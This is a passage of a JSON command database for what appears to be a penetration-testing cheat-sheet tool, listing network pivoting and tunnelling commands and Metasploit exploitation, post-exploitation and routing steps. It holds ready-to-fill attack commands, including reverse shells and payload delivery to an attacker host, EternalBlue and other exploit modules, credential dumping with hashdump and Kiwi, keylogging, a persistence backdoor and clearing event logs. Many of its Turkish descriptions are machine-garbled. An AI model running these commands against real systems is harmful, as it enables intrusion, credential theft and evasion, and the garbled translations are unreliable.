            "desc_tr": "Proxy üzerinden dahili MSSQL'de OS komutu çalıştır"
          },
          {
            "title": "Proxychains Impacket MSSQL",
            "desc": "Connect to internal MSSQL with impacket through proxy",
            "cmd": "proxychains -q impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP> -windows-auth",
            "tags": [
              "essential"
            ],
            "desc_tr": "Proxy üzerinden dahili MSSQL'e impacket ile bağlan"
          }
        ],
        "name_tr": "SOCKS Proxying"
      },
      {
        "name": "Windows Port Forwards",
        "commands": [
          {
            "title": "Netsh Port Forward Add",
            "desc": "Create port forward using netsh",
            "cmd": "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT> connectaddress=<TARGET_IP> connectport=<TARGET_PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: port forward netsh kullanarak"
          },
          {
            "title": "Netsh Show Port Forwards",
            "desc": "List all active port forwards",
            "cmd": "netsh interface portproxy show all",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm active port forwards"
          },
          {
            "title": "Netsh Delete Port Forward",
            "desc": "Remove a port forward rule",
            "cmd": "netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=<LISTEN_PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kaldır: a port forward rule"
          },
          {
            "title": "Netsh Firewall Allow Port",
            "desc": "Open firewall port for the forward",
            "cmd": "netsh advfirewall firewall add rule name=\"Forward\" dir=in action=allow protocol=tcp localport=<LISTEN_PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Aç: firewall port for the forward"
          },
          {
            "title": "Plink Local Forward",
            "desc": "PuTTY plink for SSH local port forward",
            "cmd": "plink.exe -ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<PIVOT_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "PuTTY plink for SSH yerel port forward"
          },
          {
            "title": "Plink Remote Forward",
            "desc": "PuTTY plink for SSH remote port forward",
            "cmd": "plink.exe -ssh -R <ATTACKER_PORT>:127.0.0.1:<LOCAL_PORT> <USER>@<ATTACKER_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "PuTTY plink for SSH uzak port forward"
          },
          {
            "title": "Plink Dynamic SOCKS",
            "desc": "PuTTY plink for dynamic SOCKS proxy",
            "cmd": "plink.exe -ssh -D 1080 <USER>@<ATTACKER_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "PuTTY plink for dynamic SOCKS vekil sunucu (proxy)"
          }
        ],
        "name_tr": "Windows Port Forwards"
      },
      {
        "name": "Other Tunneling Tools",
        "commands": [
          {
            "title": "Socat Port Forward",
            "desc": "Forward port using socat",
            "cmd": "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yönlendir: port socat kullanarak"
          },
          {
            "title": "Socat Port Forward (Background)",
            "desc": "Background socat forwarder",
            "cmd": "socat TCP-LISTEN:<LISTEN_PORT>,fork TCP:<TARGET_IP>:<TARGET_PORT> &",
            "tags": [
              "essential"
            ],
            "desc_tr": "Background socat forwarder"
          },
          {
            "title": "Netcat Relay (mkfifo)",
            "desc": "Create netcat relay for port forwarding",
            "cmd": "mkfifo /tmp/relay; nc -lvnp <LISTEN_PORT> < /tmp/relay | nc <TARGET_IP> <TARGET_PORT> > /tmp/relay",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: netcat relay for port forwarding"
          },
          {
            "title": "Rpivot Server (Attacker)",
            "desc": "Start rpivot SOCKS server on attacker",
            "cmd": "python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080",
            "tags": [
              "tool"
            ],
            "desc_tr": "Başlat: rpivot SOCKS server attacker üzerinde"
          },
          {
            "title": "Rpivot Client (Target)",
            "desc": "Connect rpivot client to attacker server",
            "cmd": "python client.py --server-ip <ATTACKER_IP> --server-port 9999",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: rpivot client attacker server'e"
          },
          {
            "title": "Dnscat2 Server",
            "desc": "Start DNS tunnel server",
            "cmd": "ruby dnscat2.rb <DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Başlat: DNS tunnel server"
          },
          {
            "title": "Dnscat2 Client",
            "desc": "Connect via DNS tunnel from target",
            "cmd": "dnscat2 <DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Bağlan: DNS tunnel target üzerinden üzerinden"
          },
          {
            "title": "Iodine DNS Tunnel Server",
            "desc": "Create IP-over-DNS tunnel server",
            "cmd": "iodined -f -c -P <PASS> 10.0.0.1 <TUNNEL_DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: IP-over-DNS tunnel server"
          },
          {
            "title": "Iodine DNS Tunnel Client",
            "desc": "Connect to IP-over-DNS tunnel",
            "cmd": "iodine -f -P <PASS> <TUNNEL_DOMAIN>",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Bağlan: IP-over-DNS tunnel'e"
          },
          {
            "title": "ICMP Shell (icmpsh)",
            "desc": "Start ICMP-based reverse shell listener",
            "cmds": [
              "# Attacker:",
              "python icmpsh_m.py <ATTACKER_IP> <TARGET_IP>",
              "# Target (Windows):",
              "icmpsh.exe -t <ATTACKER_IP>"
            ],
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Başlat: ICMP-based ters bağlantı kabuğu listener"
          },
          {
            "title": "Neo-reGeorg Tunnel",
            "desc": "Web-based tunnel via uploaded web shell",
            "cmds": [
              "# Generate tunnel webshell:",
              "python neoreg.py generate -k <PASSWORD>",
              "# Upload tunnel.php/aspx/jsp to target, then:",
              "python neoreg.py -k <PASSWORD> -u http://<TARGET_IP>/tunnel.php"
            ],
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Web-based tunnel uploaded web kabuğu üzerinden"
          },
          {
            "title": "Invoke-SocksProxy (PowerShell)",
            "desc": "Create SOCKS proxy on Windows via PowerShell",
            "cmd": "Import-Module .\\Invoke-SocksProxy.psm1; Invoke-SocksProxy -bindPort 1080",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Oluştur: SOCKS vekil sunucu (proxy) Windows PowerShell üzerinden üzerinde"
          },
          {
            "title": "FPipe Port Forward (Windows)",
            "desc": "Port forwarding tool for Windows",
            "cmd": "fpipe.exe -l <LISTEN_PORT> -r <TARGET_PORT> <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Port forwarding tool for Windows"
          }
        ],
        "name_tr": "Other Tunneling Tools"
      },
      {
        "name": "Double Pivoting",
        "commands": [
          {
            "title": "Double Pivot SSH",
            "desc": "Chain two SSH tunnels",
            "cmds": [
              "# First hop: ssh -NfD 1080 <USER1>@<PIVOT1>",
              "# Second hop: proxychains ssh -NfD 1081 <USER2>@<PIVOT2>",
              "# Use: proxychains4 -f proxy2.conf nmap -sT -Pn <DEEP_TARGET>"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Chatwo SSH tunnels içinde"
          },
          {
            "title": "Double Pivot Chisel",
            "desc": "Chain Chisel tunnels",
            "cmds": [
              "# Attacker: chisel server --reverse -p 8000",
              "# Pivot1: chisel client <ATTACKER_IP>:8000 R:1080:socks",
              "# Pivot2: proxychains chisel client <PIVOT2>:8001 R:1081:socks"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "ChaChisel tunnels içinde"
          }
        ],
        "name_tr": "Double Pivoting"
      }
    ],
    "name_tr": "Ağ Pivotlama ve Trafik Yönlendirme",
    "description_tr": "Route traffic through compromised hosts to reach internal networks using SSH tunnels, SOCKS proxies, and specialized pivoting tools."
  },
  {
    "id": "metasploit",
    "name": "Metasploit Operations",
    "icon": "🔧",
    "description": "Metasploit Framework for exploitation, post-exploitation, and pivoting",
    "subcategories": [
      {
        "name": "Framework Setup & Navigation",
        "commands": [
          {
            "title": "Initialize Metasploit Database",
            "cmd": "sudo msfdb init",
            "tags": [
              "essential"
            ],
            "desc": "Initialize the PostgreSQL database for Metasploit",
            "desc_tr": "Initialize the PostgreSQL database for Metasploit"
          },
          {
            "title": "Start Metasploit Database",
            "cmd": "sudo msfdb start",
            "tags": [
              "essential"
            ],
            "desc": "Start the Metasploit database service",
            "desc_tr": "Başlat: the Metasploit database service"
          },
          {
            "title": "Launch Metasploit Console",
            "cmd": "msfconsole -q",
            "tags": [
              "essential"
            ],
            "desc": "Start Metasploit Framework console in quiet mode",
            "desc_tr": "Başlat: Metasploit Framework console quiet mode içinde"
          },
          {
            "title": "Check Database Status",
            "cmd": "db_status",
            "tags": [
              "essential"
            ],
            "desc": "Verify database connectivity inside msfconsole",
            "desc_tr": "Doğrula: database connectivity inside msfconsole"
          },
          {
            "title": "Create Workspace",
            "cmd": "workspace -a <PROJECT_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Create a new workspace to organize engagements",
            "desc_tr": "Oluştur: a new workspace organize engagements'e"
          },
          {
            "title": "List Workspaces",
            "cmd": "workspace",
            "tags": [
              "essential"
            ],
            "desc": "List all available workspaces",
            "desc_tr": "Listele: tüm available workspaces"
          },
          {
            "title": "Switch Workspace",
            "cmd": "workspace <PROJECT_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Switch to a specific workspace",
            "desc_tr": "Geçiş yap: a belirli workspace'e"
          },
          {
            "title": "Delete Workspace",
            "cmd": "workspace -d <PROJECT_NAME>",
            "tags": [
              "tool"
            ],
            "desc": "Delete a workspace and its associated data",
            "desc_tr": "Sil: a workspace and its associated data"
          },
          {
            "title": "Search for Modules",
            "cmd": "search type:exploit platform:windows <KEYWORD>",
            "tags": [
              "essential"
            ],
            "desc": "Search for exploit modules by keyword and platform",
            "desc_tr": "Ara: for istismar modules by keyword and platform"
          },
          {
            "title": "Search CVE",
            "cmd": "search cve:<CVE_YEAR>-<CVE_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Search modules by CVE identifier",
            "desc_tr": "Ara: modules by CVE identifier"
          },
          {
            "title": "Use a Module",
            "cmd": "use exploit/windows/smb/ms17_010_eternalblue",
            "tags": [
              "essential"
            ],
            "desc": "Select a module to configure and run",
            "desc_tr": "Select a module configure and run'e"
          },
          {
            "title": "Show Module Info",
            "cmd": "info",
            "tags": [
              "essential"
            ],
            "desc": "Display detailed information about the selected module",
            "desc_tr": "Display detailed informatiabout the selected module üzerinde"
          },
          {
            "title": "Show Module Options",
            "cmd": "show options",
            "tags": [
              "essential"
            ],
            "desc": "Display configurable options for the current module",
            "desc_tr": "Display configurable options for the mevcut module"
          },
          {
            "title": "Show Available Payloads",
            "cmd": "show payloads",
            "tags": [
              "essential"
            ],
            "desc": "List compatible payloads for the current exploit",
            "desc_tr": "Listele: compatible payloads for the mevcut istismar"
          },
          {
            "title": "Show Targets",
            "cmd": "show targets",
            "tags": [
              "tool"
            ],
            "desc": "List available target configurations for the exploit",
            "desc_tr": "Listele: available target configurations for the istismar"
          },
          {
            "title": "Set Module Option",
            "cmd": "set RHOSTS <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Set a module-specific option",
            "desc_tr": "Ayarla: a module-belirli option"
          },
          {
            "title": "Set Global Option",
            "cmd": "setg RHOSTS <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Set a global option persisting across modules",
            "desc_tr": "Ayarla: a global optipersisting modules üzerinde genelinde"
          },
          {
            "title": "Import Nmap Scan",
            "cmd": "db_nmap -sV -O <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc": "Run nmap and import results directly into the database",
            "desc_tr": "Çalıştır: nmap and import results directly inthe database'e"
          },
          {
            "title": "Import External Scan",
            "cmd": "db_import /path/to/scan.xml",
            "tags": [
              "tool"
            ],
            "desc": "Import nmap/Nessus/etc. XML results into the workspace",
            "desc_tr": "İçe aktar: nmap/Nessus/etc. XML results inthe workspace'e"
          },
          {
            "title": "List Discovered Hosts",
            "cmd": "hosts",
            "tags": [
              "tool"
            ],
            "desc": "Show all hosts stored in the current workspace database",
            "desc_tr": "Göster: tüm hosts stored the mevcut workspace database içinde"
          },
          {
            "title": "List Discovered Services",
            "cmd": "services",
            "tags": [
              "tool"
            ],
            "desc": "Show all services found in the current workspace",
            "desc_tr": "Göster: tüm services found the mevcut workspace içinde"
          },
          {
            "title": "List Stored Credentials",
            "cmd": "creds",
            "tags": [
              "tool"
            ],
            "desc": "Show all credentials gathered in the workspace",
            "desc_tr": "Göster: tüm kimlik bilgileri gathered the workspace içinde"
          },
          {
            "title": "List Loot",
            "cmd": "loot",
            "tags": [
              "tool"
            ],
            "desc": "Show all loot (files, hashes) collected in the workspace",
            "desc_tr": "Göster: tüm loot (files, hashes) collected the workspace içinde"
          }
        ],
        "name_tr": "Framework Setup & Navigation"
      },
      {
        "name": "Exploitation Modules",
        "commands": [
          {
            "title": "EternalBlue (MS17-010)",
            "cmds": [
              "use exploit/windows/smb/ms17_010_eternalblue",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "set payload windows/x64/meterpreter/reverse_tcp",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Exploit MS17-010 SMB vulnerability for remote code execution",
            "desc_tr": "İstismar et: r MS17-010 SMB zafiyet(ler) for uzak kod çalıştırma"
          },
          {
            "title": "PsExec Module",
            "cmds": [
              "use exploit/windows/smb/psexec",
              "set RHOSTS <TARGET_IP>",
              "set SMBUser <USER>",
              "set SMBPass <PASS>",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Authenticate and execute payload via SMB PsExec",
            "desc_tr": "kimlik doğrulama and execute payload SMB PsExec üzerinden"
          },
          {
            "title": "Web Delivery (PowerShell)",
            "cmds": [
              "use exploit/multi/script/web_delivery",
              "set target 2",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Host a payload for download and execution via PowerShell one-liner",
            "desc_tr": "Host a payload for download and executiPowerShell one-liner üzerinden üzerinde"
          },
          {
            "title": "Web Delivery (Python)",
            "cmds": [
              "use exploit/multi/script/web_delivery",
              "set target 0",
              "set payload python/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Host a payload for download and execution via Python one-liner",
            "desc_tr": "Host a payload for download and executiPython one-liner üzerinden üzerinde"
          },
          {
            "title": "Java RMI Server",
            "cmds": [
              "use exploit/multi/misc/java_rmi_server",
              "set RHOSTS <TARGET_IP>",
              "set payload java/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit Java RMI registry for code execution",
            "desc_tr": "İstismar et: r Java RMI registry for kod çalıştırma"
          },
          {
            "title": "Tomcat Manager Upload",
            "cmds": [
              "use exploit/multi/http/tomcat_mgr_upload",
              "set RHOSTS <TARGET_IP>",
              "set RPORT 8080",
              "set HttpUsername <USER>",
              "set HttpPassword <PASS>",
              "set payload java/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Deploy a WAR payload through Tomcat Manager",
            "desc_tr": "Deploy a WAR payload Tomcat Manager üzerinden"
          },
          {
            "title": "Multi/Handler Listener",
            "cmds": [
              "use exploit/multi/handler",
              "set payload windows/x64/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a background listener for incoming reverse shells",
            "desc_tr": "Başlat: a background listener for incoming reverse shells"
          },
          {
            "title": "Multi/Handler (Linux)",
            "cmds": [
              "use exploit/multi/handler",
              "set payload linux/x64/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "set LPORT <PORT>",
              "exploit -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a background listener for Linux reverse meterpreter",
            "desc_tr": "Başlat: a background listener for Linux reverse meterpreter"
          },
          {
            "title": "Run Exploit as Background Job",
            "cmd": "exploit -j",
            "tags": [
              "essential"
            ],
            "desc": "Launch the current exploit as a background job",
            "desc_tr": "Launch the mevcut istismar as a background job"
          },
          {
            "title": "HTA Server Delivery",
            "cmds": [
              "use exploit/windows/misc/hta_server",
              "set SRVHOST <ATTACKER_IP>",
              "set payload windows/meterpreter/reverse_tcp",
              "set LHOST <ATTACKER_IP>",
              "exploit -j"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Serve an HTA payload for client-side exploitation",
            "desc_tr": "Serve an HTA payload for client-side istismar"
          },
          {
            "title": "MS08-067 NetAPI",
            "cmds": [
              "use exploit/windows/smb/ms08_067_netapi",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit the classic MS08-067 Windows vulnerability",
            "desc_tr": "İstismar et: r the classic MS08-067 Windows zafiyet(ler)"
          },
          {
            "title": "PHP CGI Argument Injection",
            "cmds": [
              "use exploit/multi/http/php_cgi_arg_injection",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit PHP-CGI argument injection (CVE-2012-1823)",
            "desc_tr": "İstismar et: r PHP-CGI argument enjeksiy(CVE-2012-1823) üzerinde"
          },
          {
            "title": "Rejetto HFS RCE",
            "cmds": [
              "use exploit/windows/http/rejetto_hfs_exec",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "exploit"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Exploit Rejetto HTTP File Server for remote code execution",
            "desc_tr": "İstismar et: r RejetHTTP File Server for uzak kod çalıştırma'e"
          },
          {
            "title": "Drupalgeddon2",
            "desc": "Drupal RCE",
            "cmds": [
              "use exploit/unix/webapp/drupal_drupalgeddon2",
              "set RHOSTS <TARGET_IP>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Drupal RCE"
          },
          {
            "title": "Jenkins Script Console",
            "desc": "Jenkins Groovy RCE",
            "cmds": [
              "use exploit/multi/http/jenkins_script_console",
              "set RHOSTS <TARGET_IP>",
              "set RPORT 8080",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Jenkins Groovy RCE"
          },
          {
            "title": "WordPress Admin Upload",
            "desc": "WP shell upload",
            "cmds": [
              "use exploit/unix/webapp/wp_admin_shell_upload",
              "set RHOSTS <TARGET_IP>",
              "set USERNAME <USER>",
              "set PASSWORD <PASS>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "WP shell upload"
          },
          {
            "title": "UAC Bypass FodHelper",
            "desc": "Local UAC bypass",
            "cmds": [
              "use exploit/windows/local/bypassuac_fodhelper",
              "set SESSION <ID>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "yerel UAC bypass"
          },
          {
            "title": "PwnKit",
            "desc": "Linux pkexec privesc",
            "cmds": [
              "use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec",
              "set SESSION <ID>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Linux pkexec privesc"
          }
        ],
        "name_tr": "Exploitation Modules"
      },
      {
        "name": "Meterpreter Post-Exploitation",
        "commands": [
          {
            "title": "System Information",
            "cmd": "sysinfo",
            "tags": [
              "essential"
            ],
            "desc": "Display target system information from meterpreter",
            "desc_tr": "Display target system informatimeterpreter üzerinden üzerinde"
          },
          {
            "title": "Current User ID",
            "cmd": "getuid",
            "tags": [
              "essential"
            ],
            "desc": "Show the user the meterpreter process is running as",
            "desc_tr": "Göster: the user the meterpreter process is running as"
          },
          {
            "title": "Elevate to SYSTEM",
            "cmd": "getsystem",
            "tags": [
              "essential"
            ],
            "desc": "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM",
            "desc_tr": "Dene: escalate privileges to NT AUTHORITY\\SYSTEM'e"
          },
          {
            "title": "Dump Password Hashes",
            "cmd": "hashdump",
            "tags": [
              "essential"
            ],
            "desc": "Dump SAM database password hashes (requires SYSTEM)",
            "desc_tr": "Dökümle: SAM database password hashes (requires SYSTEM)"
          },
          {
            "title": "Load Kiwi (Mimikatz)",
            "cmd": "load kiwi",
            "tags": [
              "essential"
            ],
            "desc": "Load the Kiwi extension for credential extraction",
            "desc_tr": "Yükle: the Kiwi extensifor kimlik bilgileri extraction üzerinde"
          },
          {
            "title": "Dump All Credentials",
            "cmd": "creds_all",
            "tags": [
              "essential"
            ],
            "desc": "Dump all credentials including Kerberos tickets via Kiwi",
            "desc_tr": "Dökümle: tüm kimlik bilgileri including Kerberos tickets Kiwi üzerinden"
          },
          {
            "title": "Dump Kerberos Credentials",
            "cmd": "kerberos",
            "tags": [
              "advanced"
            ],
            "desc": "Dump Kerberos tickets from memory via Kiwi",
            "desc_tr": "Dökümle: Kerberos tickets memory Kiwi üzerinden üzerinden"
          },
          {
            "title": "Dump WiFi Passwords",
            "cmd": "wifi_list",
            "tags": [
              "advanced"
            ],
            "desc": "List and dump saved WiFi credentials via Kiwi",
            "desc_tr": "Listele: and dump kayıtlı WiFi kimlik bilgileri Kiwi üzerinden"
          },
          {
            "title": "Upload File to Target",
            "cmd": "upload /path/to/local/file C:\\\\Windows\\\\Temp\\\\file",
            "tags": [
              "essential"
            ],
            "desc": "Upload a file from attacker to target machine",
            "desc_tr": "Yükle: a file attacker target machine üzerinden'e"
          },
          {
            "title": "Download File from Target",
            "cmd": "download C:\\\\Users\\\\<USER>\\\\Desktop\\\\secrets.txt /tmp/loot/",
            "tags": [
              "essential"
            ],
            "desc": "Download a file from target to attacker machine",
            "desc_tr": "İndir: a file target attacker machine üzerinden'e"
          },
          {
            "title": "Search for Files",
            "cmd": "search -f *.txt -d C:\\\\Users\\\\",
            "tags": [
              "essential"
            ],
            "desc": "Search for files matching a pattern on the target",
            "desc_tr": "Ara: for files matching a pattern the target üzerinde"
          },
          {
            "title": "Search for Password Files",
            "cmd": "search -f *pass* -d C:\\\\",
            "tags": [
              "tool"
            ],
            "desc": "Search for files containing password in the name",
            "desc_tr": "Ara: for files containing password the name içinde"
          },
          {
            "title": "List Running Processes",
            "cmd": "ps",
            "tags": [
              "essential"
            ],
            "desc": "List all running processes on the target",
            "desc_tr": "Listele: tüm çalışan process the target üzerinde"
          },
          {
            "title": "Migrate to Another Process",
            "cmd": "migrate <PID>",
            "tags": [
              "essential"
            ],
            "desc": "Migrate meterpreter to a different process for stability or privilege",
            "desc_tr": "Migrate meterpreter a different process for stability or privilege'e"
          },
          {
            "title": "Drop to System Shell",
            "cmd": "shell",
            "tags": [
              "essential"
            ],
            "desc": "Open an interactive system command shell",
            "desc_tr": "Aç: an interactive system command shell"
          },
          {
            "title": "Background Current Session",
            "cmd": "background",
            "tags": [
              "essential"
            ],
            "desc": "Background the current meterpreter session",
            "desc_tr": "Background the mevcut meterpreter session"
          },
          {
            "title": "Screenshot",
            "cmd": "screenshot",
            "tags": [
              "tool"
            ],
            "desc": "Capture a screenshot of the target's desktop",
            "desc_tr": "Yakala: a screenshot of the target's desktop"
          },
          {
            "title": "Keylog Start",
            "cmd": "keyscan_start",
            "tags": [
              "advanced"
            ],
            "desc": "Start capturing keystrokes on the target",
            "desc_tr": "Başlat: capturing keystrokes the target üzerinde"
          },
          {
            "title": "Keylog Dump",
            "cmd": "keyscan_dump",
            "tags": [
              "advanced"
            ],
            "desc": "Dump captured keystrokes",
            "desc_tr": "Dökümle: captured keystrokes"
          },
          {
            "title": "Enable RDP",
            "cmd": "run post/windows/manage/enable_rdp",
            "tags": [
              "advanced"
            ],
            "desc": "Enable Remote Desktop on the target",
            "desc_tr": "Etkinleştir: uzak Desktop the target üzerinde"
          },
          {
            "title": "Persistence via Registry",
            "cmd": "run persistence -U -i 10 -p <PORT> -r <ATTACKER_IP>",
            "tags": [
              "advanced"
            ],
            "desc": "Install a persistent reverse connection backdoor",
            "desc_tr": "Kur: a persistent reverse connectibackdoor üzerinde"
          },
          {
            "title": "Local Exploit Suggester",
            "cmd": "run post/multi/recon/local_exploit_suggester",
            "tags": [
              "essential"
            ],
            "desc": "Suggest local privilege escalation exploits for the target",
            "desc_tr": "Suggest yerel yetki yükseltme exploits for the target"
          },
          {
            "title": "Enum Logged On Users",
            "cmd": "run post/windows/gather/enum_logged_on_users",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate currently and recently logged on users",
            "desc_tr": "Listele: currently and recently logged users üzerinde"
          },
          {
            "title": "Enum Shares",
            "cmd": "run post/windows/gather/enum_shares",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate network shares on the target",
            "desc_tr": "Listele: network shares the target üzerinde"
          },
          {
            "title": "Enum Linux System",
            "cmd": "run post/linux/gather/enum_system",
            "tags": [
              "tool"
            ],
            "desc": "Enumerate system information on a Linux target",
            "desc_tr": "Listele: system information a Linux target üzerinde"
          },
          {
            "title": "Clear Event Logs",
            "desc": "Cover tracks",
            "cmd": "clearev",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Cover tracks"
          },
          {
            "title": "Keylogger",
            "desc": "Start keylogger",
            "cmds": [
              "keyscan_start",
              "keyscan_dump",
              "keyscan_stop"
            ],
            "tags": [
              "tool"
            ],
            "desc_tr": "Başlat: keylogger"
          },
          {
            "title": "Shell to Meterpreter",
            "desc": "Upgrade shell",
            "cmds": [
              "use post/multi/manage/shell_to_meterpreter",
              "set SESSION <ID>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Upgrade shell"
          }
        ],
        "name_tr": "Meterpreter Post-Exploitation"
      },
      {
        "name": "Session Pivoting & Routing",
        "commands": [
          {
            "title": "List Active Sessions",
            "cmd": "sessions -l",
            "tags": [
              "essential"
            ],
            "desc": "List all active meterpreter/shell sessions",
            "desc_tr": "Listele: tüm active meterpreter/shell sessions"
          },
          {
            "title": "Interact with Session",
            "cmd": "sessions -i <SESSION_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Interact with a specific session by ID",
            "desc_tr": "Interact a belirli sessiby ID ile üzerinde"
          },
          {
            "title": "Kill All Sessions",
            "cmd": "sessions -K",
            "tags": [
              "tool"
            ],
            "desc": "Terminate all active sessions",
            "desc_tr": "Terminate tüm active sessions"
          },
          {
            "title": "Auto-Route via Session",
            "cmds": [
              "use post/multi/manage/autoroute",
              "set SESSION <SESSION_ID>",
              "set SUBNET <INTERNAL_SUBNET>",
              "set NETMASK 255.255.255.0",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Add a route to an internal network through a meterpreter session",
            "desc_tr": "Ekle: a route an internal network a meterpreter session'e üzerinden"
          },
          {
            "title": "Auto-Route (Meterpreter)",
            "cmd": "run autoroute -s <INTERNAL_SUBNET>/24",
            "tags": [
              "essential"
            ],
            "desc": "Add route from within a meterpreter session",
            "desc_tr": "Ekle: route witha meterpreter sessiüzerinden üzerinde içinde"
          },
          {
            "title": "Print Routes",
            "cmd": "run autoroute -p",
            "tags": [
              "tool"
            ],
            "desc": "Display all routes added through meterpreter sessions",
            "desc_tr": "Display tüm routes added meterpreter sessions üzerinden"
          },
          {
            "title": "SOCKS Proxy for Pivoting",
            "cmds": [
              "use auxiliary/server/socks_proxy",
              "set SRVHOST 127.0.0.1",
              "set SRVPORT 1080",
              "set VERSION 5",
              "run -j"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Start a SOCKS5 proxy to route tools through the pivot",
            "desc_tr": "Başlat: a SOCKS5 vekil sunucu (proxy) route tools the pivot'e üzerinden"
          },
          {
            "title": "Port Forward (Local)",
            "cmd": "portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Forward a local port to a remote service through meterpreter",
            "desc_tr": "Yönlendir: a yerel port a uzak service meterpreter'e üzerinden"
          },
          {
            "title": "Port Forward (List)",
            "cmd": "portfwd list",
            "tags": [
              "tool"
            ],
            "desc": "List all active port forwards",
            "desc_tr": "Listele: tüm active port forwards"
          },
          {
            "title": "Port Forward (Flush)",
            "cmd": "portfwd flush",
            "tags": [
              "tool"
            ],
            "desc": "Remove all active port forwards",
            "desc_tr": "Kaldır: tüm active port forwards"
          },
          {
            "title": "Upgrade Shell to Meterpreter",
            "cmds": [
              "use post/multi/manage/shell_to_meterpreter",
              "set SESSION <SESSION_ID>",
              "set LHOST <ATTACKER_IP>",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Upgrade a basic shell session to a meterpreter session",
            "desc_tr": "Upgrade a basic shell sessia meterpreter session üzerinde'e"
          }
        ],
        "name_tr": "Session Pivoting & Routing"
      },
      {
        "name": "Auxiliary Modules",
        "commands": [
          {
            "title": "SMB Version Scanner",
            "cmds": [
              "use auxiliary/scanner/smb/smb_version",
              "set RHOSTS <TARGET_RANGE>",
              "set THREADS 10",
              "run"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Scan for SMB versions across a range of hosts",
            "desc_tr": "Tara: ma for SMB versions a range of hosts genelinde"
          },
          {
            "title": "TCP Port Scanner",
            "cmds": [
              "use auxiliary/scanner/portscan/tcp",
              "set RHOSTS <TARGET_RANGE>",
